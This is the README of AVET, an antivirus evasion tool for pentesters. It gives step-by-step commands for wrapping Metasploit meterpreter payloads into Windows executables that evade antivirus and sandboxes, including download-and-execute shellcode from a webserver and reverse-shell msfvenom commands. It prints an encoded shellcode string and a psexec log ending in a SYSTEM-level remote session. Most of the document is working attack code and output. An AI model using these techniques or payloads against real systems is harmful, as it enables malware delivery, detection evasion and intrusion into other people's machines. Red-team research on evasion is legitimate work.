AntiVirus Evasion Tool
======================

AVET is an AntiVirus Evasion Tool, which was developed for making life easier for pentesters and for experimenting with antivirus evasion techniques.
In version 1.2 new stuff was introduced, for a complete overview have a look at the CHANGELOG file.

For basics about antivirus evasion, AVET & more information have a look here: 
- https://govolution.wordpress.com/2017/07/27/paper-avet-blackhat-usa-2017/
- https://govolution.wordpress.com/2017/06/11/avet-video/
- https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf
- https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf
- https://twitter.com/DanielX4v3r

What & Why:
- when running an exe file made with msfpayload & co, the exe file will often be recognized by the antivirus software
- avet is a antivirus evasion tool targeting windows machines with executable files
- assembly shellcodes can be used
- make_avet can be used for configuring the sourcecode
- with make_avet you can load ASCII encoded shellcodes from a textfile or from a webserver, further it is using an av evasion technique to avoid sandboxing and emulation
- call msf ASCII encoded shellcode as a parameter from cmd
- for ASCII encoding the shellcode the tool format.sh and sh_format are included
- this readme applies for Kali 2 (64bit) and tdm-gcc

How to install tdm-gcc with wine:
https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/


How to use make_avet and build scripts
--------------------------------------
Compile if needed, for example if you use a 32 bit system:
```
$ gcc -o make_avet make_avet.c
```

The purpose of make_avet is to preconfigure a definition file (defs.h) so that the source code can be compiled in the next step. This way the payload will be encoded as ASCII payload or with encoders from metasploit. You hardly can beat shikata-ga-nai.

Let's have a look at the options from make_avet, examples will be given below:
```
-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.bin
   when called with -E call with mytrojan.exe shellcode.txt
-f compile shellcode into .exe, needs filename of shellcode file
-u load and exec shellcode from url using internet explorer (url is compiled into executable)
-d download a raw shellcode via http in memory and exec (no overhead, use socket)
   usage example: pwn.exe http://yourserver/yourpayload.bin
-E use avets ASCII encryption, often do not has to be used
   Can be used with -l
-F use fopen sandbox evasion
-k "killswitch" sandbox evasion with gethostbyname
-X compile for 64 bit
-p print debug information
-q quiet mode (hide console window)
-h help
```

Of course it is possible to run all commands step by step from command line. But it is strongly recommended to use build scripts or the avet_fabric.py.

The build scripts themselves are written so as they have to be called from within the avet directory:
```
root@kalidan:~/tools/avet# ./build/build_win32_meterpreter_rev_https_20xshikata.sh
```

Examples
--------
Here are the commented examples for building the .exe files from the build directory. 

```
buildsvc_win32_meterpreter_bind_tcp_20xshikata.sh
Service example for win32.

build_win32_meterpreter_rev_https_50xshikata_quiet.sh
In this example the evasion technique is simple. The shellcode is encoded with 20 rounds of 
shikata-ga-nai, often enough that does the trick (note: Now it might be more ;) ). This 
technique is pretty similar to a junk loop. Execute so much code that the AV engine breaks up 
execution and let the file pass. Here in quiet mode, the window is hidden.

build_win32_meterpreter_rev_https_50xshikata.sh
See previous, window not hidden.

build_win32_meterpreter_rev_https_ASCIIMSF_cmd.sh
It is possible to load shellcode as a parameter from cmd like:
C:\> pwn.exe PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYlzHOrgpwpEPapLIheeaIPrDLKRp00NkV26lnkCbUDlK0r4OMg0JtfEaKONLWLe1aldBTlWPo1hOVmFa8GZBJRsbRwLKPRVplKqZ7LnkRlB1CHhc2hS1Jq3alKf9Q0GqICnkG97hhcfZaYnkttlKfaJvuayoNLZaJoFm31JgehKPaeYf4CamHx7KSM5t2UzDbxlKBxFDFaKcE6lK6lpKlKshELWqKcLKeTNkFaHPni1Ta4dd3k1KaqBy2zF1ioM0qOQOpZlKR2XkLMQMphPn3UT4uPsXqgQypnQy1DcXBlqgUvFgioZuDqKkRs0SBssccc3XFZ66RYI7KO9EaCpS0jtCf3v3SXoKva30309xKtuPs07pfOabF8rlcopdG3VUrK0n07BMVYSQE2T8ROGEPOPLphP8e7du0iqj3osISqBR0grC2tCfroef1aRU1OblRMqzd1UaBx737D1OW1dpv9fV7pv0SXv7k9mOkvYokeniXFF32HEPEbM0MT63v3bsaGaCsfSXJKV5DnWKKOiENv1zgzaOE8opp3S0wpMY9p1z3460SZGorvU8CEBfMNOvkOyE1CpSaC2spVqxVMtF7hCK9oXUNekpCE5DU8OxGcc0EPaxStZPVUM0kOjupO45xMyx0LePEPWp1zspQxWpR0uPS0u8c030aPc0bs3X68i42sHeioiENs2sBsOyHgrwqxEPa0eP30v3V6cXuBofNiZByo8UmUIP448ONkFg5QO3NeKpT5Iuv8O3CojHrKYo9oyop1DyEbFNfQtvGHVNDqUafVDnubDpuhUPoKxpH5i2sf2JC0sc9ohUAA

build_win32_meterpreter_rev_https_ASCIIMSF.sh

build_win32_meterpreter_rev_https_fopen_shikata_quiet.sh
AV evasion with the fopen technique, hidden window.

build_win32_meterpreter_rev_https_fopen_shikata.sh
See previous example.

build_win32_meterpreter_rev_https_killswitch_shikata.sh
AV evasion with the killswitch technique.

build_win32_meterpreter_rev_https_shikata_downloadexecshellcode_DKMC.sh
Like build_win32_meterpreter_rev_https_shikata_downloadexecshellcode.sh, but also builds the
payload with DKMC, a tool by https://github.com/mrun1k0d3r.
For more: https://govolution.wordpress.com/2018/03/02/download-exec-poc-and-dkmc/

build_win32_meterpreter_rev_https_shikata_downloadexecshellcode.sh
This one downloads a shellcode from a webserver into memory and executes the shellcode.

build_win32_meterpreter_rev_https_shikata_fopen.sh
Sandbox evasion with fopen and additional encoding

build_win32_meterpreter_rev_https_shikata_loadfile.sh
Loading and exec shellcode from given file, needs avets encoding.

build_win32_meterpreter_rev_https_shikata_load_ie.sh
This is a bit tricky and might not work on the first shot. The executable will start Internet Explorer and download the ASCII encoded shellcode. Then the shellcode will be read from the cache directory and if found executed. This was tested with Windows 7 only.

build_win32_meterpreter_rev_https_shikata_load_ie_debug.sh
Same as before with debug output.

build_win32_meterpreter_rev_https_shikata_raw_loadfile.sh
Example for loading raw shellcode files.

build_win32_meterpreter_unstaged_rev_https_40xshikata.sh
Unstaged payload with dlls included. For more see https://govolution.wordpress.com/2017/05/06/avet-and-unstaged-payloads/

build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
Build this one for Kaspersky, don't know if it is still unrecognized.

build_win64_meterpreter_rev_tcp_xor_downloadexecshellcode.sh
This one downloads a shellcode from a webserver into memory and executes the shellcode.

build_win64_meterpreter_rev_tcp_xor_fopen.sh
64bit executable with fopen evasion.

build_win64_meterpreter_rev_tcp_xor.sh
64bit executable.
```

avet_fabric.py
--------------
avet_fabric is an assistant, that loads all build scripts in the build directory (name has to be build*.sh) and then lets the user edit the settings line by line. This is under huge development.

Example:
```
# ./avet_fabric.py 

                       .|        ,       +
             *         | |      ((             *
                       |'|       `    ._____
         +     ___    |  |   *        |.   |' .---"|
       _    .-'   '-. |  |     .--'|  ||   | _|    |
    .-'|  _.|  |    ||   '-__  |   |  |    ||      |
    |' | |.    |    ||       | |   |  |    ||      |
 ___|  '-'     '    ""       '-'   '-.'    '`      |____
jgs~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

AVET 1.2 Blackhat USA 2017 edition
by Daniel Sauder

avet_fabric.py is an assistant for building exe files with shellcode payloads for targeted attacks and antivirus evasion.

0: build_win32_meterpreter_rev_https_shikata_loadfile.sh
1: build_win32_meterpreter_rev_https_shikata_fopen.sh
2: build_win32_meterpreter_rev_https_shikata_load_ie_debug.sh
3: build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
4: build_win32_meterpreter_rev_https_20xshikata.sh
5: build_win32_meterpreter_rev_https_shikata_load_ie.sh
6: build_win64_meterpreter_rev_tcp.sh
Input number of the script you want use and hit enter: 6

Now you can edit the build script line by line.

simple example script for building the .exe file
$ . build/global_win64.sh
make meterpreter reverse payload
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
format the shellcode for make_avet
$ ./format.sh sc.txt > scclean.txt && rm sc.txt
call make_avet, compile
$ ./make_avet -f scclean.txt -X -E
$ $win64_compiler -o pwn.exe avet.c
cleanup
$ rm scclean.txt && echo "" > defs.h

The following commands will be executed:
#/bin/bash
. build/global_win64.sh
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
./format.sh sc.txt > scclean.txt && rm sc.txt
./make_avet -f scclean.txt -X -E
$win64_compiler -o pwn.exe avet.c
rm scclean.txt && echo "" > defs.h

Press enter to continue.

Building the output file...

Please stand by...

The output file should be placed in the current directory.

Bye...
```

AVET & metasploit psexec
------------------------
New in version 1.2 is the support for metasploits psexec module. The corresponding make file looks like:

```
#!/bin/bash          
# simple example script for building the .exe file
# for use with msf psexec module
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# make meterpreter bind payload, encoded 20 rounds with shikata_ga_nai
msfvenom -p windows/meterpreter/bind_tcp lport=8443 -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > sc.txt
# call make_avetsvc, the sandbox escape is due to the many rounds of decoding the shellcode
./make_avetsvc -f sc.txt
# compile to pwn.exe file
$win32_compiler -o pwnsvc.exe avetsvc.c
# cleanup
echo "" > defs.h
```

And on the metasploit site:
```
msf exploit(psexec) > use exploit/windows/smb/psexec
msf exploit(psexec) > set EXE::custom /root/tools/ave/pwn.exe
EXE::custom => /root/tools/ave/pwn.exe
msf exploit(psexec) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf exploit(psexec) > set rhost 192.168.116.183
rhost => 192.168.116.183
msf exploit(psexec) > set smbuser dax
smbuser => dax
msf exploit(psexec) > set smbpass test123
smbpass => test123
msf exploit(psexec) > set lport 8443
lport => 8443
msf exploit(psexec) > run

[*] 192.168.116.183:445 - Connecting to the server...
[*] Started bind handler
[*] 192.168.116.183:445 - Authenticating to 192.168.116.183:445 as user 'dax'...
[*] Sending stage (957487 bytes) to 192.168.116.183
[*] 192.168.116.183:445 - Selecting native target
[*] 192.168.116.183:445 - Uploading payload...
[*] 192.168.116.183:445 - Using custom payload /root/tools/avepoc/a.exe, RHOST and RPORT settings will be ignored!
[*] 192.168.116.183:445 - Created \mzrCIOVg.exe...
[+] 192.168.116.183:445 - Service started successfully...
[*] 192.168.116.183:445 - Deleting \mzrCIOVg.exe...
[-] 192.168.116.183:445 - Delete of \mzrCIOVg.exe failed: The server responded with error: STATUS_CANNOT_DELETE (Command=6 WordCount=0)
[*] Exploit completed, but no session was created.
msf exploit(psexec) > [*] Meterpreter session 4 opened (192.168.116.142:33453 -> 192.168.116.183:8443) at 2017-05-27 18:47:23 +0200

msf exploit(psexec) > sessions

Active sessions
===============

Id Type Information Connection
-- ---- ----------- ----------
4 meterpreter x86/windows NT-AUTORIT_T\SYSTEM @ DAX-RYMZ48Z3EYO 192.168.116.142:33453 -> 192.168.116.183:8443 (192.168.116.183)

msf exploit(psexec) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > sysinfo
Computer : DAX-RYMZ48Z3EYO
OS : Windows XP (Build 2600, Service Pack 3).
Architecture : x86
System Language : de_DE
Domain : ARBEITSGRUPPE
Logged On Users : 2
Meterpreter : x86/windows
```
